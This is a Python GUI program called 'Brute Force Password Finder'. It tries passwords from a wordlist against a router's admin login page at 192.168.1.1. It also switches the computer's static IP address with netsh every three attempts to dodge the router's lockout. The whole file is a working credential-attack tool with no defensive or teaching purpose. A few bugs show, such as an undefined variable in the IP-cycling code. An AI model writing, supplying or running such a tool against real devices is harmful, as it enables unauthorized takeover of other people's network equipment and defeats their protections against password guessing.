import tkinter as tk
from tkinter import filedialog, messagebox
import socket
import struct
import subprocess
import requests
import time
import webbrowser
from requests.exceptions import ConnectionError
import threading
import re

def ip_to_int(ip):
    """Convert an IP string to an integer."""
    return struct.unpack("!I", socket.inet_aton(ip))[0]

def int_to_ip(ip_int):
    """Convert an integer to an IP string."""
    return socket.inet_ntoa(struct.pack("!I", ip_int))

def get_interface_names():
    output = subprocess.run(['netsh', 'interface', 'show', 'interface'], capture_output=True, text=True)
    lines = output.stdout.splitlines()
    interface_names = []

    # Skip the header and parse interface names
    for line in lines[3:]:
        if line.strip():  # Skip empty lines
            columns = line.split()
            if len(columns) >= 4:
                interface_name = columns[3]
                interface_names.append(interface_name)

    return interface_names

class IPChanger:
    def __init__(self, start_ip, end_ip):
        self.start_ip_int = ip_to_int(start_ip)
        self.end_ip_int = ip_to_int(end_ip)

    def increment_ip(self):
        self.start_ip_int += 1
        if self.start_ip_int > self.end_ip_int:
            self.start_ip_int = ip_to_int(start_ip)
        return int_to_ip(self.start_ip_int)

def change_ip(interface, new_ip, subnet_mask, gateway):
    try:
        subprocess.run(['netsh', 'interface', 'ip', 'set', 'address', 
                        f'name={interface}', 'static', new_ip, subnet_mask, gateway], check=True)
        print(f"IP address of {interface} changed to {new_ip}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to change IP address: {e}")

def make_post_request(password, ip_changer, interface, subnet_mask, gateway):
    url = "http://192.168.1.1/boaform/admin/formLogin"
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "en-US,en;q=0.9,la;q=0.8,tr;q=0.7",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Length": "119",
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "192.168.1.1",
        "Origin": "http://192.168.1.1",
        "Referer": "http://192.168.1.1/admin/login.asp",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
    }
    data = {
        "challenge": "",
        "username": "admin",
        "password": password,
        "timezone": "15:00",
        "dst_enabled": "OFF",
        "save": "Login",
        "submit-url": "/admin/login.asp"
    }
    
    try:
        response = requests.post(url, headers=headers, data=data)
        return response.status_code, response.text
    except ConnectionError as e:
        print(f"Connection error: {e}")
        return None, None

def logout():
    logout_url = "http://192.168.1.1/boaform/admin/formLogout"
    params = {"save": "Logout"}
    try:
        response = requests.get(logout_url, params=params)
        print("Logged out successfully.")
    except ConnectionError as e:
        print(f"Connection error during logout: {e}")

def enable_dhcp(interface):
    try:
        subprocess.run(['netsh', 'interface', 'ip', 'set', 'address', interface, 'dhcp'], check=True)
        print(f"DHCP enabled on {interface}.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to enable DHCP: {e}")

def brute_force_passwords(password_file, ip_changer, interface, subnet_mask, gateway, status_label, progress_label, passphrase_label):
    with open(password_file, 'r') as file:
        password_list = file.read().splitlines()
    
    total_passwords = len(password_list)
    tested_passwords = 0
    correct_password = None
    skipped_passwords = []
    
    for idx, password in enumerate(password_list):
        tested_passwords += 1
        status_label.config(text=f"Testing password: {password}")
        passphrase_label.config(text=f"Current passphrase: {password}")
        progress_label.config(text=f"Progress: {tested_passwords}/{total_passwords}")
        
        if idx > 0 and idx % 3 == 0:  # Change IP after every 3 attempts
            new_ip = ip_changer.increment_ip()
            change_ip(interface, new_ip, subnet_mask, gateway)
            print(f"Changed IP to {new_ip}, waiting 5 seconds before continuing...")
            status_label.config(text=f"Changed IP to {new_ip}, waiting 5 seconds...")
            time.sleep(5)
        
        status_code, response_text = make_post_request(password, ip_changer, interface, subnet_mask, gateway)
        
        if status_code is None:
            print(f"Skipping attempt with password '{password}' due to connection error.")
            status_label.config(text=f"Skipping attempt with password '{password}' due to connection error.")
            skipped_passwords.append(password)
            continue
        
        print(f"Attempt {idx + 1} with password '{password}' returned status code {status_code}")
        
        if "home page" in response_text.lower():
            print(f"Password found: '{password}'")
            status_label.config(text=f"Password found: '{password}'")
            correct_password = password
            break
        
        if "ERROR: bad password!" in response_text:
            print(f"Password '{password}' is incorrect.")
            status_label.config(text=f"Password '{password}' is incorrect.")
        elif "ERROR: you have logined error 3 times" in response_text:
            print("Detected lockout after 3 failed attempts.")
            new_ip = ip_changer.increment_ip()
            change_ip(interface, new_ip, subnet_mask, gateway)
            print(f"Changed IP to {new_ip}, waiting 5 seconds before continuing...")
            status_label.config(text=f"Changed IP to {new_ip}, waiting 5 seconds...")
            time.sleep(5)
    
    if not correct_password:
        print("Initial brute force completed. Retesting skipped passwords.")
        status_label.config(text="Retesting skipped passwords.")
        
        retry_attempts = 0
        
        for password in skipped_passwords: # retry skipped passwords due to errors
            tested_passwords += 1
            status_label.config(text=f"Retesting password: {password}")
            passphrase_label.config(text=f"Current passphrase: {password}")
            progress_label.config(text=f"Progress: {tested_passwords}/{total_passwords + len(skipped_passwords)}")
            
            if retry_attempts > 0 and retry_attempts % 3 == 0:  # Change IP after every 3 retry attempts
                new_ip = ip_changer.increment_ip()
                change_ip(interface, new_ip, subnet_mask, gateway)
                print(f"Changed IP to {new_ip}, waiting 5 seconds before continuing...")
                status_label.config(text=f"Changed IP to {new_ip}, waiting 5 seconds...")
                time.sleep(5)
            
            status_code, response_text = make_post_request(password, ip_changer, interface, subnet_mask, gateway)
            retry_attempts += 1
            
            if status_code is None:
                print(f"Skipping attempt with password '{password}' again due to connection error.")
                status_label.config(text=f"Skipping attempt with password '{password}' again due to connection error.")
                continue
            
            print(f"Retesting attempt with password '{password}' returned status code {status_code}")
            
            if "home page" in response_text.lower():
                print(f"Password found: '{password}'")
                status_label.config(text=f"Password found: '{password}'")
                correct_password = password
                break
            
            if "ERROR: bad password!" in response_text:
                print(f"Password '{password}' is incorrect.")
                status_label.config(text=f"Password '{password}' is incorrect.")
            elif "ERROR: you have logined error 3 times" in response_text:
                print("Detected lockout after 3 failed attempts.")
                new_ip = ip_changer.increment_ip()
                change_ip(interface, new_ip, subnet_mask, gateway)
                print(f"Changed IP to {new_ip}, waiting 5 seconds before continuing...")
                status_label.config(text=f"Changed IP to {new_ip}, waiting 5 seconds...")
                time.sleep(5)

    if not correct_password:
        print("Brute force completed. No correct password found.")
        status_label.config(text="Brute force completed. No correct password found.")
    
    return correct_password




def start_brute_force(password_file, interface, start_ip, end_ip, subnet_mask, gateway, status_label, progress_label, passphrase_label):
    ip_changer = IPChanger(start_ip, end_ip)
    correct_password = brute_force_passwords(password_file, ip_changer, interface, subnet_mask, gateway, status_label, progress_label, passphrase_label)
    if correct_password:
        # Display a messagebox with options
        choice = messagebox.askquestion("Password Found", f"Password found: '{correct_password}'\nDo you want to navigate to the admin panel?")
        if choice == 'yes':
            webbrowser.open("http://192.168.1.1/")
        elif choice == 'no':
            logout()
            enable_dhcp(interface)
        else:
            print("Invalid choice. Exiting.")
            status_label.config(text="Invalid choice. Exiting.")
    else:
        print("No correct password found.")
        status_label.config(text="No correct password found.")


def reenable_dhcp(interface, status_label):
    enable_dhcp(interface)
    status_label.config(text=f"DHCP re-enabled on {interface}.")

def browse_file(entry):
    filename = filedialog.askopenfilename()
    if filename:
        entry.delete(0, tk.END)
        entry.insert(0, filename)

def create_gui():
    root = tk.Tk()
    root.title("Brute Force Password Finder")

    # Password list file
    tk.Label(root, text="Password List:").grid(row=0, column=0, padx=10, pady=5)
    password_list_entry = tk.Entry(root, width=50)
    password_list_entry.grid(row=0, column=1, padx=10, pady=5)
    tk.Button(root, text="Browse", command=lambda: browse_file(password_list_entry)).grid(row=0, column=2, padx=10, pady=5)

    # Interface name dropdown
    tk.Label(root, text="Interface:").grid(row=1, column=0, padx=10, pady=5)
    interface_names = get_interface_names()
    interface_var = tk.StringVar(root)
    interface_var.set(interface_names[0])  # Set default value
    interface_dropdown = tk.OptionMenu(root, interface_var, *interface_names)
    interface_dropdown.grid(row=1, column=1, padx=10, pady=5)

    # Start IP address
    tk.Label(root, text="Start IP Address:").grid(row=2, column=0, padx=10, pady=5)
    start_ip_entry = tk.Entry(root, width=50)
    start_ip_entry.insert(0, "192.168.1.30")  # Default value
    start_ip_entry.grid(row=2, column=1, padx=10, pady=5)

    # End IP address
    tk.Label(root, text="End IP Address:").grid(row=3, column=0, padx=10, pady=5)
    end_ip_entry = tk.Entry(root, width=50)
    end_ip_entry.insert(0, "192.168.1.100")  # Default value
    end_ip_entry.grid(row=3, column=1, padx=10, pady=5)

    # Default subnet mask
    tk.Label(root, text="Subnet Mask:").grid(row=4, column=0, padx=10, pady=5)
    subnet_mask_entry = tk.Entry(root, width=50)
    subnet_mask_entry.insert(0, "255.255.255.0")  # Default value
    subnet_mask_entry.grid(row=4, column=1, padx=10, pady=5)

    # Default gateway
    tk.Label(root, text="Default Gateway:").grid(row=5, column=0, padx=10, pady=5)
    gateway_entry = tk.Entry(root, width=50)
    gateway_entry.insert(0, "192.168.1.1")  # Default value
    gateway_entry.grid(row=5, column=1, padx=10, pady=5)

    # Status and progress labels
    passphrase_label = tk.Label(root, text="Current passphrase:", bd=1, relief=tk.SUNKEN, anchor=tk.W)
    passphrase_label.grid(row=7, column=0, columnspan=3, sticky=tk.W+tk.E)
    progress_label = tk.Label(root, text="Progress: 0/0", bd=1, relief=tk.SUNKEN, anchor=tk.W)
    progress_label.grid(row=8, column=0, columnspan=3, sticky=tk.W+tk.E)
    status_label = tk.Label(root, text="Status: Ready", bd=1, relief=tk.SUNKEN, anchor=tk.W)
    status_label.grid(row=9, column=0, columnspan=3, sticky=tk.W+tk.E)


    # Start button
    start_button = tk.Button(root, text="Start Brute Force", command=lambda: threading.Thread(target=start_brute_force, args=(
        password_list_entry.get(),
        interface_var.get(),
        start_ip_entry.get(),
        end_ip_entry.get(),
        subnet_mask_entry.get(),
        gateway_entry.get(),
        passphrase_label,
        progress_label,
        status_label)).start())
    start_button.grid(row=10, column=0, columnspan=3, pady=10)

    # Re-enable DHCP button
    dhcp_button = tk.Button(root, text="Re-enable DHCP", command=lambda: reenable_dhcp(interface_var.get(), status_label))
    dhcp_button.grid(row=11, column=0, columnspan=3, pady=10)

    root.mainloop()

if __name__ == "__main__":
    create_gui()
